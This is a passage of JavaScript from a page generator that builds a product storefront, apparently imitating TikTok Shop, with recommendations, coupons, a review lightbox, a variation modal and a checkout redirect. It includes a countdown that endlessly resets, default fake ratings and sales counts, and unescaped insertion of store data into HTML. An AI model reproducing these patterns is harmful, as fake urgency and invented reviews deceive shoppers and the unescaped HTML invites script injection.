        const rating = rec.productRating || "4.9";
        const salesCount = rec.salesCount || "100";
        const hasDiscount = rec.originalPrice && rec.originalPrice !== rec.currentPrice;
        const recIdSafe = recId.replace(/'/g, "\\'"); 
        return `<div class="recommendation-item" onclick="loadProduct('${recIdSafe}')">
            <img class="recommendation-image" src="${image}" alt="${title}">
            <div class="recommendation-info">
                <div class="recommendation-title">${title}</div>
                <div class="recommendation-price-row">
                    <span class="recommendation-price">${cur.symbol} ${price}</span>
                    ${hasDiscount ? `<span class="recommendation-original-price">${cur.symbol} ${originalPrice}</span>` : ''}
                </div>
                <div class="recommendation-badges">
                    <span class="rec-badge-shipping">${t.free_shipping}</span>
                    <span class="rec-badge-installment">3x ${t.interest_free || 'sem juros'}</span>
                </div>
                <div class="recommendation-rating">
                    <svg class="rec-star-icon" viewBox="0 0 24 24" fill="#fbbf24" stroke="none"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
                    <span class="rec-rating-value">${rating}</span>
                    <span class="rec-sold-count">| ${salesCount} ${t.sold_count}</span>
                </div>
            </div>
        </div>`; 
    }).join("");

    const shippingAndVariationsHTML = `
    <section class="shipping-info" style="padding: 4px 0; background: #fff; margin-bottom: 8px;">
        <div class="shipping-row" style="padding: 10px 16px; display: flex; align-items: flex-start; gap: 8px;">
            <img class="shipping-icon" src="https://editor.sys-assets-check.com/img/entrega.png" alt="Entrega" width="16" height="16" style="display:inline-block; transform: scale(0.95); flex-shrink:0; margin-top:1px;">
            <div style="display: flex; flex-direction: column; align-items: flex-start; gap: 3px; flex: 1; min-width: 0;">
                <div style="display: flex; align-items: center; gap: 7px;">
                    <span style="background: #eafaf0; color: #16a34a; font-size: 12px; font-weight: 700; border-radius: 5px; padding: 1px 7px; display: inline-block;">${t.free_shipping}</span>
                    <span class="shipping-fee" style="color: #999; font-size: 12px; text-decoration: line-through;">${cur.symbol} ${cur.shippingCost}</span>
                </div>
                <span id="shipping-date" style="color: #161823; font-size: 14px; font-weight: 400;">${t.shipping_title}</span>
            </div>
            <svg style="flex-shrink:0; opacity:0.45; margin-top:2px;" width="18" height="18" fill="none" stroke="#888" stroke-width="2" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"></path></svg>
        </div>
        <div style="height: 1px; background-color: #f0f0f0; margin: 0; width: 100%;"></div>
        <div id="variacoes-preview-row" style="display: flex; align-items: center; gap: 10px; padding: 11px 16px; cursor:pointer;" onclick="openModal('buy')">
            <img src="https://editor.sys-assets-check.com/img/grid.png" alt="Opções" width="15" height="15" style="margin-right: 2px; opacity:0.7; flex-shrink:0;">
            <div id="variacoes-thumbs" style="display: flex; gap: 6px;"></div>
            <span id="variacoes-qtd" style="color: #888; font-size: 14px; margin-left: 6px; font-weight: 400;">${t.select_options}</span>
            <svg style="margin-left: auto; opacity:0.45; flex-shrink:0;" width="18" height="18" fill="none" stroke="#888" stroke-width="2" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"></path></svg>
        </div>
        <div style="height: 1px; background-color: #f0f0f0; margin: 0; width: 100%;"></div>
    </section>`;

    // --- PROTECAO DO CLIENTE ---
    const protectionItems = [
        t.protection_1 || 'Devolução gratuita',
        t.protection_2 || 'Reembolso se algo der errado',
        t.protection_3 || 'Pagamento seguro',
        t.protection_4 || 'Se o pedido não for enviado no prazo'
    ];
    const protectionHTML = `<section class="customer-protection">
        <div class="protection-header">
            <svg class="shield-icon" viewBox="0 0 736 859" fill="currentColor" style="transform:scaleY(-1);"><path d="M361.3 846c-6.4-1.3-9.4-3.2-24.2-15.4-33.7-27.9-67.6-49.5-111.6-71.1-55.3-27.1-99.9-42.3-167.3-57-8.9-1.9-18-4.4-20.1-5.4-4.7-2.5-9.7-8.1-12.5-14-2.1-4.6-2.1-5.3-2.4-110.1-.3-109.4.1-124.4 3.9-153.9 8.9-69.5 36.3-140.4 76.2-197.3 54.1-77.2 131.6-141.7 228.3-190.1 20.3-10.2 26.1-12.1 36.7-11.9 9.4.1 16 2.3 31.7 10.2 92.7 47 162 102.5 218.2 174.5 46.6 59.8 79.2 138.3 88.8 213.9 3.7 29.2 4.1 47.9 3.8 156.1-.3 103.3-.3 104-2.4 108.6-2.8 6-7.8 11.6-12.7 14-2.1 1.1-11.8 3.8-21.5 5.9-43.2 9.4-69.2 17-107.2 31-60.7 22.5-126.7 59.9-170.5 96.9-14 11.9-16.2 13.3-22.3 14.7-6.3 1.5-6.9 1.5-12.9.4zm139.2-269.9c6.9-3.1 40.3-25.1 42.9-28.2 2.9-3.4 4.1-8.5 3.2-13.1-.5-2.7-10.5-18.6-40.3-64.3-4.6-7.1-11-17-14.2-22-3.2-4.9-10.8-16.6-16.8-26-14.3-22-55.6-86-61.3-95-2.5-3.8-9.1-13.9-14.7-22.5-5.7-8.5-12-18.4-14.2-22-8.8-14.7-19-19.8-31-15.5-6.1 2.1-7.5 3.5-25.4 23.8-27.9 31.6-83.1 93.6-94 105.5-6.3 6.8-8.7 11.3-8.7 16.2 0 3.5 2.1 8.6 4.7 11.5 2.9 3.2 28.1 25.7 33 29.4 9.1 6.9 17.9 4.9 27.4-6.3 3-3.4 16.9-19.2 30.9-35.1 14-15.8 27.1-30.6 29.1-32.8l3.6-4.1 5.8 8.9c3.2 5 8.8 13.7 12.5 19.5 3.7 5.8 13.2 20.6 21.2 33 20.5 31.8 51.2 79.4 58.3 90.3 3.3 5.1 11.1 17.2 17.3 26.9 6.2 9.7 12.2 18.4 13.2 19.3 2.1 1.9 8.5 4.4 11.5 4.4 1.1 0 3.8-.8 6-1.8z"/></svg>
            <span class="protection-title">${t.protection_title || 'Proteção do cliente'}</span>
            <svg class="protection-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
        </div>
        <div class="protection-items">
            ${protectionItems.map((p) => `<div class="protection-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg><span>${p}</span></div>`).join("")}
        </div>
    </section>`;

    // --- OFERTAS / CUPONS (puxados da Config da Loja) ---
    const escQuote = (s) => String(s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    const offerCoupons = [
        { title: data.couponTitle, sub: data.couponSub },
        { title: data.discountTitle, sub: data.discountSub }
    ].filter((c) => c.title);
    const offersHTML = offerCoupons.length ? `<section class="offers-section">
        <div class="offers-header">
            <span class="offers-title">${t.offers_title || 'Ofertas'}</span>
            <svg class="offers-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
        </div>
        <div class="offers-coupons">
            ${offerCoupons.map((c) => `<div class="offer-coupon">
                <div class="offer-coupon-info">
                    <div class="offer-coupon-title">${c.title}</div>
                    <div class="offer-coupon-sub">${c.sub || ''}</div>
                </div>
                <button class="offer-coupon-btn" onclick="resgatarOferta(this, '${escQuote(c.title)}')">${t.claim || 'Resgatar'}</button>
            </div>`).join("")}
        </div>
    </section>` : "";

    // --- LÓGICA DO RODAPÉ: Verifica se exibir ou ocultar ---
    // Define se as informações de texto do rodapé aparecem ou não
    // --- LÓGICA DO RODAPÉ (AJUSTADA) ---
    const showFooter = (data.enableFooter !== false);

    // pageFooterHTML: Controla Links, CNPJ e Endereço (Soma se desmarcar)
    const pageFooterHTML = showFooter ? `<footer class="page-footer-container"><div class="page-footer-grid"><div class="page-footer-col"><h4>${t.footer_institutional}</h4><ul><li><a href="${data.footerLinkPrivacy}">${t.footer_links[0]}</a></li><li><a href="${data.footerLinkExchanges}">${t.footer_links[1]}</a></li><li><a href="${data.footerLinkShipping}">${t.footer_links[2]}</a></li><li><a href="${data.footerLinkTerms}">${t.footer_links[3]}</a></li></ul></div><div class="page-footer-col"><h4>${t.footer_help}</h4><p>${t.label_email} ${data.footerEmail}</p><p>${t.label_whatsapp} ${data.footerWhatsapp}</p><p>${t.label_address} ${data.footerAddress}</p></div><div class="page-footer-col"><h4>${t.footer_about}</h4><p>${t.label_cnpj} ${data.footerCnpj}</p><p>${t.label_business_name} ${data.footerCompanyName}</p><p>${data.footerSecurityText}</p>${data.footerSecuritySealsImg ? `<img src="${data.footerSecuritySealsImg}" alt="Selos de Segurança">` : ""}</div></div><div class="page-footer-copyright"><p>&copy; ${data.footerCopyrightYear} - ${data.footerCopyrightText}. ${t.footer_rights}.</p></div></footer>` : "";

    // footerHTML: Agora é SEMPRE visível, independente da caixa marcada
    const footerHTML = `
    <div class="footer">
        <div class="footer-icons">
            <button class="footer-icon-btn" onclick="window.location.href='loja.html'">
                <img src="https://editor.sys-assets-check.com/img/lojanv.jpg" alt="${t.footer_icon_store}">
                <span>${t.footer_icon_store}</span>
            </button>
            <button class="footer-icon-btn">
                <img src="https://editor.sys-assets-check.com/img/chatnv.jpg" alt="${t.footer_icon_chat}">
                <span>${t.footer_icon_chat}</span>
            </button>
        </div>
        <div class="footer-actions">
            <button class="footer-btn add-to-cart-btn" onclick="openModal('cart')"><span>${t.btn_add_cart}</span></button>
            <button class="footer-btn buy-now-btn" onclick="openModal('buy')"><span>${t.btn_buy}</span><span class="buy-now-subtitle">${t.free_shipping}</span></button>
        </div>
    </div>`;

    // 6. Script do Cliente (INJETANDO TRADUÇÕES NO JS DO SITE GERADO)
    const generatedScript = `
    document.addEventListener('DOMContentLoaded', function() {
        var el = function(s) { return document.querySelector(s); };
        var all = function(s) { return document.querySelectorAll(s); };
        var allProducts = ${JSON.stringify(allProducts)};
        var urlParams = new URLSearchParams(window.location.search);
        var urlId = urlParams.get('product');
        var currentProductId = urlId && allProducts[urlId] ? urlId : ${JSON.stringify(mainProductId)};
        if(urlId && allProducts[urlId] && urlId !== ${JSON.stringify(mainProductId)}) { setTimeout(function() { loadProduct(urlId); }, 100); }
        var modalMode = 'buy';
        var useInternalCheckout = ${data.useCustomCheckout};

        // ===== Favoritos (bookmark) =====
        var favoritedProducts = {};
        var favToastTimer = null;
        function showFavToast(added) {
            var toast = document.getElementById('fav-toast');
            if (!toast) return;
            if (favToastTimer) { clearTimeout(favToastTimer); }
            if (added) {
                toast.className = 'fav-toast toast-added';
                toast.innerHTML = '<div class="fav-toast-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>' +
                    '<div class="fav-toast-msg">Adicionado aos favoritos. Voce pode encontra-lo em Perfil &gt; Favoritos &gt; Produtos.</div>';
            } else {
                toast.className = 'fav-toast toast-removed';
                toast.innerHTML = 'Produto removido dos favoritos';
            }
            requestAnimationFrame(function() { toast.classList.add('show'); });
            favToastTimer = setTimeout(function() { toast.classList.remove('show'); }, added ? 2200 : 1800);
        }
        window.toggleFavorite = function(btn) {
            var isFav = btn.classList.toggle('favorited');
            if (typeof currentProductId !== 'undefined' && currentProductId) {
                favoritedProducts[currentProductId] = isFav;
            }
            showFavToast(isFav);
        };

        // ===== Lightbox de avaliacoes (foto em tela cheia, igual TikTok Shop) =====
        var rlImages = [];
        var rlIndex = 0;
        function rlStarsSVG(count) {
            var s = '';
            for (var i = 0; i < 5; i++) {
                var fill = i < count ? 'currentColor' : 'none';
                s += '<svg viewBox="0 0 24 24" fill="' + fill + '" stroke="currentColor" stroke-width="0" style="' + (i >= count ? 'color:rgba(255,255,255,0.25);' : '') + '"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>';
            }
            return s;
        }
        function rlShow(i) {
            if (i < 0) i = 0;
            if (i > rlImages.length - 1) i = rlImages.length - 1;
            rlIndex = i;
            var img = document.getElementById('rl-image');
            if (img) { img.style.transform = 'translateY(0)'; img.style.opacity = '1'; img.src = rlImages[i]; }
            var cur = document.getElementById('rl-current');
            if (cur) cur.textContent = (i + 1);
        }
        window.openReviewLightbox = function(imgEl) {
            var item = imgEl.closest('.review-item');
            if (!item) return;
            // Coleta todas as fotos da avaliacao clicada
            var imgs = item.querySelectorAll('.rev-img');
            rlImages = [];
            var startIndex = 0;
            for (var k = 0; k < imgs.length; k++) {
                rlImages.push(imgs[k].src);
                if (imgs[k] === imgEl) startIndex = k;
            }
            // Dados da avaliacao
            var nameEl = item.querySelector('.rev-name');
            var variantEl = item.querySelector('.rev-variant');
            var textEl = item.querySelector('.rev-text');
            var avatarEl = item.querySelector('.rev-avatar');
            var starsFilled = item.querySelectorAll('.rev-stars-row .rev-star-icon:not(.empty)').length || 5;
            var name = nameEl ? nameEl.textContent : '';
            document.getElementById('rl-name').textContent = name;
            document.getElementById('rl-variant').textContent = variantEl ? variantEl.textContent : '';
            document.getElementById('rl-text').textContent = textEl ? textEl.textContent : '';
            document.getElementById('rl-stars').innerHTML = rlStarsSVG(starsFilled);
            var rlAvatar = document.getElementById('rl-avatar');
            if (avatarEl) {
                var avImg = avatarEl.querySelector('img');
                rlAvatar.innerHTML = avImg ? '<img src="' + avImg.src + '" alt="">' : (name ? name.charAt(0) : '?');
            } else { rlAvatar.textContent = name ? name.charAt(0) : '?'; }
            document.getElementById('rl-total').textContent = rlImages.length;
            rlShow(startIndex);
            var box = document.getElementById('review-lightbox');
            box.style.display = 'flex';
            requestAnimationFrame(function() { box.classList.add('open'); });
            document.body.style.overflow = 'hidden';
            document.body.classList.add('review-lightbox-open');
        };
        window.closeReviewLightbox = function() {
            var box = document.getElementById('review-lightbox');
            box.classList.remove('open');
            document.body.style.overflow = '';
            document.body.classList.remove('review-lightbox-open');
            setTimeout(function() { box.style.display = 'none'; }, 200);
        };
        // Gestos: arrastar para baixo fecha; arrastar lateral troca a foto
        (function() {
            var stage = document.getElementById('rl-stage');
            if (!stage) return;
            var startX = 0, startY = 0, dx = 0, dy = 0, dragging = false, axis = null;
            function onStart(e) {
                var t = e.touches ? e.touches[0] : e;
                startX = t.clientX; startY = t.clientY; dx = 0; dy = 0; dragging = true; axis = null;
            }
            function onMove(e) {
                if (!dragging) return;
                var t = e.touches ? e.touches[0] : e;
                dx = t.clientX - startX; dy = t.clientY - startY;
                if (!axis && (Math.abs(dx) > 8 || Math.abs(dy) > 8)) axis = Math.abs(dy) > Math.abs(dx) ? 'y' : 'x';
                var img = document.getElementById('rl-image');
                if (axis === 'y' && dy > 0) {
                    if (e.cancelable) e.preventDefault();
                    img.style.transform = 'translateY(' + dy + 'px)';
                    img.style.opacity = String(Math.max(0.3, 1 - dy / 400));
                }
            }
            function onEnd() {
                if (!dragging) return;
                dragging = false;
                var img = document.getElementById('rl-image');
                if (axis === 'y' && dy > 110) { closeReviewLightbox(); return; }
                if (axis === 'x' && Math.abs(dx) > 60) {
                    if (dx < 0) rlShow(rlIndex + 1); else rlShow(rlIndex - 1);
                    return;
                }
                img.style.transform = 'translateY(0)'; img.style.opacity = '1';
            }
            stage.addEventListener('touchstart', onStart, { passive: true });
            stage.addEventListener('touchmove', onMove, { passive: false });
            stage.addEventListener('touchend', onEnd);
            stage.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', function(e) { if (dragging) onMove(e); });
            window.addEventListener('mouseup', onEnd);
        })();
        document.addEventListener('keydown', function(e) {
            var box = document.getElementById('review-lightbox');
            if (!box || !box.classList.contains('open')) return;
            if (e.key === 'Escape') closeReviewLightbox();
            else if (e.key === 'ArrowRight') rlShow(rlIndex + 1);
            else if (e.key === 'ArrowLeft') rlShow(rlIndex - 1);
        });
        
        // VARIAVEIS DE MOEDA INJETADAS
        var currencySymbol = '${cur.symbol}';
        var currencyLocale = '${cur.locale}';
        
        // FUNÇÃO DE FORMATAÇÃO JS LADO CLIENTE
        function formatMoneyJS(val) {
            let num = parseFloat(String(val).replace(/[^0-9.,]/g, '').replace(',', '.'));
            if(isNaN(num)) num = 0;
            return num.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        // Renderiza uma URL de midia da descricao como <video> (se for video) ou <img>
        function descMediaTagJS(url) {
            if (!url) return '';
            if (/\\.mp4(\\?|$)/i.test(url) || /mime_type=video|video_mp4|\\/video\\/tos\\//i.test(url)) {
                var posterUrl = url.indexOf('#') === -1 ? url + '#t=0.1' : url;
                return '<video src="' + posterUrl + '" controls playsinline muted preload="metadata" style="width:100%;height:auto;display:block;background:#000;"></video>';
            }
            return '<img src="' + url + '" alt="Imagem Detalhe do Produto">';
        }

        // Formata a descricao (nome, subtitulos, listas) igual ao produto principal
        function beautifyDescJS(text) {
            if (!text || !text.trim()) return '';
            if (/<(p|div|ul|li|h[1-6]|br)\\b/i.test(text)) {
                return '<div class="desc-rich">' + text + '</div>';
            }
            var esc = function(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); };
            // Se o texto veio "corrido" (sem quebras de linha, comum nas recomendacoes),
            // reconstroi as quebras antes de bullets e apos pontuacao final.
            var preCheck = text.replace(/\\r/g, '');
            if (preCheck.split('\\n').filter(function(l){ return l.trim().length > 0; }).length <= 1) {
                preCheck = preCheck
                    .replace(/\\s*([•·▪◦��►])\\s*/g, '\\n$1 ')
                    .replace(/([.!?:])\\s+(?=[A-ZÀ-Ý])/g, '$1\\n');
                text = preCheck;
            }
            var lines = text.replace(/\\r/g, '').split('\\n').map(function(l){ return l.trim(); }).filter(function(l){ return l.length > 0; });
            if (lines.length === 0) return '';
            var emojiStart = /^[\\u{1F000}-\\u{1FAFF}\\u{2600}-\\u{27BF}\\u{2190}-\\u{21FF}\\u{2B00}-\\u{2BFF}\\u{FE0F}\\u{1F900}-\\u{1F9FF}]/u;
            var bulletStart = /^[·•▪◦‣\\-\\*►]\\s*/;
            var html = '';
            var listOpen = false;
            var closeList = function(){ if (listOpen) { html += '</ul>'; listOpen = false; } };
            lines.forEach(function(line, idx) {
                if (idx === 0 && line.length < 90 && !bulletStart.test(line) && !emojiStart.test(line)) {
                    closeList(); html += '<p class="desc-product-name">' + esc(line) + '</p>'; return;
                }
                if (bulletStart.test(line)) {
                    if (!listOpen) { html += '<ul class="desc-list">'; listOpen = true; }
                    var item = line.replace(bulletStart, '').trim();
                    var ci = item.indexOf(':');
                    if (ci > 0 && ci < 45) { html += '<li><strong>' + esc(item.substring(0, ci)) + ':</strong>' + esc(item.substring(ci + 1)) + '</li>'; }
                    else { html += '<li>' + esc(item) + '</li>'; }
                    return;
                }
                closeList();
                var isUpperHeader = line.length < 45 && /[A-ZÀ-Ý]/.test(line) && line === line.toUpperCase();
                var isHeader = emojiStart.test(line) || (line.endsWith(':') && line.length < 60) || isUpperHeader;
                if (isHeader) { html += '<p class="desc-subtitle">' + esc(line) + '</p>'; return; }
                html += '<p class="desc-paragraph">' + esc(line) + '</p>';
            });
            closeList();
            return '<div class="desc-rich">' + html + '</div>';
        }
        
        function updateDeliveryDate() {
            var dateEl = el('#shipping-date');
            if(dateEl) {
                var start = new Date();
                start.setDate(start.getDate() + 3);
                var end = new Date();
                end.setDate(end.getDate() + 6);
                var monthStr = end.toLocaleDateString(currencyLocale, { month: 'short' }).replace('.', '');
                var startDay = start.getDate();
                var endDay = end.getDate();
                var dateString;
                if (start.getMonth() === end.getMonth()) {
                    // Mesmo mes: "8–14 de jun"
                    dateString = startDay + '\u2013' + endDay + ' de ' + monthStr;
                } else {
                    // Meses diferentes: "28 de mai – 3 de jun"
                    var startMonth = start.toLocaleDateString(currencyLocale, { month: 'short' }).replace('.', '');
                    dateString = startDay + ' de ' + startMonth + ' \u2013 ' + endDay + ' de ' + monthStr;
                }
                dateEl.textContent = '${t.shipping_title} ' + dateString;
            }
        }
        
        function updateVariationsPreview() {
            var p = allProducts[currentProductId];
            var thumbsContainer = el('#variacoes-thumbs');
            var qtdText = el('#variacoes-qtd');
            var row = el('#variacoes-preview-row');
            if(!p || !p.colors || p.colors.length === 0) {
               if(thumbsContainer) thumbsContainer.innerHTML = '';
               if(qtdText) qtdText.textContent = '${t.view_more}';
               return;
            }
            if(row) row.style.display = 'flex';
            thumbsContainer.innerHTML = '';
            p.colors.slice(0, 4).forEach(function(c) {
                if(c.imageUrl) {
                    var img = document.createElement('img');
                    img.src = c.imageUrl;
                    img.style.width = '38px'; img.style.height = '38px';
                    img.style.objectFit = 'cover'; img.style.borderRadius = '8px';
                    img.style.background = '#fafafa';
                    thumbsContainer.appendChild(img);
                }
            });
            var totalOpts = (p.colors ? p.colors.length : 0);
            if(totalOpts > 0) qtdText.textContent = totalOpts + ' opções disponíveis';
            else qtdText.textContent = 'Ver opções';
        }

        function startCountdown() { var timeLeft = 4 * 60 + 46; var countdownEl = el('#countdown-timer'); if (!countdownEl) return; setInterval(function() { var m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2,'0'); var s = (timeLeft % 60).toString().padStart(2,'0'); countdownEl.textContent = '${t.ends_in} 00:' + m + ':' + s; if (timeLeft > 0) timeLeft--; else timeLeft = 4*60+46; }, 1000); }
        function setupSliderObserver() { var container = el('.image-slider-wrapper'); var counter = el('#image-counter'); if(!container || !counter) return; container.addEventListener('scroll', function() { var index = Math.round(container.scrollLeft / container.clientWidth) + 1; var total = container.querySelectorAll('img').length; counter.textContent = index + '/' + total; }); }
        function setupScrollObserver() { var tabs = all('.tab-item'); if (tabs.length === 0) return; window.addEventListener('scroll', function() { var scrollPos = window.pageYOffset || document.documentElement.scrollTop; var headerHeight = 100; tabs.forEach(function(tab) { var targetId = tab.getAttribute('href').substring(1); var target = el('#' + targetId); if(target) { var top = target.offsetTop - headerHeight - 20; var bottom = top + target.offsetHeight; if(scrollPos >= top && scrollPos < bottom) { tabs.forEach(t => t.classList.remove('active')); tab.classList.add('active'); } } }); }); }
        
        var mainModal = el('#variation-modal'); var mainBuyBtn = el('#buy-btn'); var selectedColor = null, selectedSize = null;
        
        window.openModal = function(mode) { 
            mainModal.classList.add('active'); 
            modalMode = mode || 'buy'; 
            mainBuyBtn.innerHTML = (modalMode === 'cart') ? '${t.btn_add_cart}' : '${t.btn_buy2}'; 
            selectedColor = null; selectedSize = null; 
            all('.color-option, .size-option').forEach(o => o.classList.remove('selected')); 
            resetModal(); 
            var qEl = el('#quantity-value'); if(qEl) qEl.textContent = '1'; 
            var cOpts = mainModal.querySelectorAll('.color-option'); if(cOpts.length === 1) cOpts[0].click(); else if(cOpts.length === 0) selectedColor = '__none__'; 
            var sOpts = mainModal.querySelectorAll('.size-option'); if(sOpts.length === 1) sOpts[0].click(); else if(sOpts.length === 0) selectedSize = '__none__'; 
            updateBuyButton(); 
        };
        
        window.closeModal = function() { mainModal.classList.remove('active'); };
        if(mainModal) { mainModal.addEventListener('click', function(e) { if(e.target.closest('.color-option')) { all('.color-option').forEach(o => o.classList.remove('selected')); var opt = e.target.closest('.color-option'); opt.classList.add('selected'); selectedColor = opt.dataset.value; var p = allProducts[currentProductId]; var cData = p.colors.find(c => c.name === selectedColor); if(cData && cData.imageUrl) el('.modal-product-image').src = cData.imageUrl; if(cData && cData.price) el('.modal-price').innerHTML = currencySymbol + ' ' + formatMoneyJS(cData.price); updateBuyButton(); } if(e.target.closest('.size-option')) { all('.size-option').forEach(o => o.classList.remove('selected')); e.target.closest('.size-option').classList.add('selected'); selectedSize = e.target.closest('.size-option').dataset.value; updateBuyButton(); } }); }
        window.updateQuantity = function(d) { var qEl = el('#quantity-value'); var v = parseInt(qEl.textContent) + d; if(v >= 1) qEl.textContent = v; };
        function updateBuyButton() { var p = allProducts[currentProductId]; var hasC = p.colors && p.colors.length > 0; var hasS = p.sizes && p.sizes.length > 0; var cOk = !hasC || (selectedColor && selectedColor !== '__none__'); var sOk = !hasS || (selectedSize && selectedSize !== '__none__'); var selectionString = ''; if(selectedColor && selectedColor !== '__none__') selectionString += selectedColor; if(selectedSize && selectedSize !== '__none__') selectionString += (selectionString ? ', ' + selectedSize : ''); if(!selectionString) selectionString = '${t.select_options}'; var txt = el('#modal-selection-text'); if(txt) txt.textContent = selectionString; if(cOk && sOk) { mainBuyBtn.classList.remove('disabled'); mainBuyBtn.classList.add('enabled'); } else { mainBuyBtn.classList.add('disabled'); mainBuyBtn.classList.remove('enabled'); } }
        window.handleMainBuyClick = function(e) { 
            if(mainBuyBtn.classList.contains('disabled')) { 
                alert('${t.select_options}'); 
                return; 
            } 
            
            var p = allProducts[currentProductId]; 
            var qty = parseInt(el('#quantity-value').textContent); 
            var variantImg = p.mainImage; 
            var variantPrice = p.currentPrice; 
            var variantUrl = p.productUrl; 

            // Se houver variação selecionada, atualiza imagem, preço e link de checkout da variação
            if(p.colors && p.colors.length > 0) { 
                var cData = p.colors.find(c => c.name === selectedColor) || p.colors[0]; 
                variantImg = cData.imageUrl; 
                variantPrice = cData.price; 
                if(cData.checkoutUrl && cData.checkoutUrl.trim() !== "") variantUrl = cData.checkoutUrl; 
            } 

            // --- LÓGICA DE DECISÃO ---
            // Se o modo for 'cart' E o usuário marcou para usar checkout PRÓPRIO (useInternalCheckout = true)
            if(modalMode === 'cart' && useInternalCheckout) { 
                // COMPORTAMENTO NORMAL: Adiciona ao carrinho
                const newItem = { 
                    id: currentProductId + '-' + Date.now(), 
                    title: p.productTitle, 
                    price: variantPrice, 
                    image: variantImg, 
                    color: selectedColor === '__none__' ? '' : selectedColor, 
                    size: selectedSize === '__none__' ? '' : selectedSize, 
                    qty: qty, 
                    selected: true 
                }; 
                let stored = localStorage.getItem('tktk_cart_items'); 
                let items = stored ? JSON.parse(stored) : []; 
                items.push(newItem); 
                localStorage.setItem('tktk_cart_items', JSON.stringify(items)); 
                updateCartCount(); 
                closeModal(); 
                showToast(); 
            } else { 
                // COMPORTAMENTO DIRETO: 
                // Se for o botão 'Comprar Agora' OU se o Checkout Externo estiver ativo (useInternalCheckout = false)
                if(useInternalCheckout) { 
                    // Vai para o seu checkout.php
                    goToCheckout([{ 
                        title: p.productTitle, 
                        price: variantPrice, 
                        image: variantImg, 
                        color: selectedColor === '__none__' ? '' : selectedColor, 
                        size: selectedSize === '__none__' ? '' : selectedSize, 
                        qty: qty 
                    }]); 
                } else { 
                    // Vai direto para o LINK EXTERNO configurado na variação/produto
                    window.location.href = variantUrl; 
                } 
            } 
        };
        function showToast() { var t = el('#added-toast'); t.style.display = 'flex'; setTimeout(function() { t.style.display = 'none'; }, 2000); }
        window.resgatarOferta = function(btn, title) {
            try { var __e = window.event; if (__e && __e.stopPropagation) __e.stopPropagation(); } catch(e) {}
            if (btn.disabled) return;
            btn.textContent = '${t.applied || 'Aplicado'}';
            btn.disabled = true;
            btn.style.background = '#fff';
            btn.style.color = '#fe2c55';
            btn.style.border = '1px solid #fe2c55';
            var x = document.getElementById('cupom-toast-mini');
            if (!x) { x = document.createElement('div'); x.id = 'cupom-toast-mini'; x.className = 'coupon-toast-mini'; document.body.appendChild(x); }
            x.textContent = '${t.coupon_claimed_msg || 'Cupom reivindicado'}';
            x.classList.add('show');
            setTimeout(function() { x.classList.remove('show'); }, 2500);
        };
        function updateCartCount() { 
            let stored = localStorage.getItem('tktk_cart_items'); 
            let items = stored ? JSON.parse(stored) : []; 
            var badge = el('.cart-badge'); 
            var total = items.reduce((acc, item) => acc + item.qty, 0); 
            if(badge) { 
                if(total > 0) { 
                    badge.textContent = total; 
                    badge.style.display = 'flex'; 
                } else { 
                    badge.textContent = '0'; 
                    badge.style.display = 'none'; 
                } 
            } 
        }

        function goToCheckout(items) { 
            var total = items.reduce((acc, i) => acc + (parseFloat(i.price.replace(',', '.')) * i.qty), 0); 
            var url = new URL('checkout.php', window.location.href); 
            url.searchParams.append('produto', items.length > 1 ? 'Pedido (' + items.length + ' itens)' : items[0].title); 
            url.searchParams.append('preco', total.toFixed(2).replace('.', ',')); 
            url.searchParams.append('imagem', items[0].image); 
            url.searchParams.append('quantidade', 1); 
            var itemsData = JSON.stringify(items.map(i => ({ 
                title: i.title, 
                price: i.price, 
                image: i.image, 
                qty: i.qty, 
                variant: (i.color ? i.color : '') + (i.size ? ' ' + i.size : '') 
            }))); 
            url.searchParams.append('items_data', encodeURIComponent(itemsData)); 
            window.location.href = url.toString(); 
        }

        function resetModal() { 
            var product = allProducts[currentProductId]; 
            if (!product) return; 
            const originalPriceNum = parseFloat(String(product.originalPrice || product.currentPrice || '0').replace(',', '.')) || 0; 
            const currentPriceNum = parseFloat(String(product.currentPrice || '0').replace(',', '.')) || 0; 
            const displayOriginalPrice = originalPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 }); 
            const displayCurrentPrice = currentPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            
            let discountBadgeHTML = ''; if (originalPriceNum > currentPriceNum) { var percent = Math.round(((originalPriceNum - currentPriceNum) / originalPriceNum) * 100); if (percent > 0) discountBadgeHTML = '<span class="modal-discount-badge">-' + percent + '%</span>'; } 
            
            let priceHTML = '<div class="price-row-modal">' + discountBadgeHTML + '<span class="modal-price">' + currencySymbol + ' ' + displayCurrentPrice + '</span></div>'; if (originalPriceNum > currentPriceNum) { priceHTML += '<div class="modal-old-price">' + currencySymbol + ' ' + displayOriginalPrice + '</div>'; } 
            
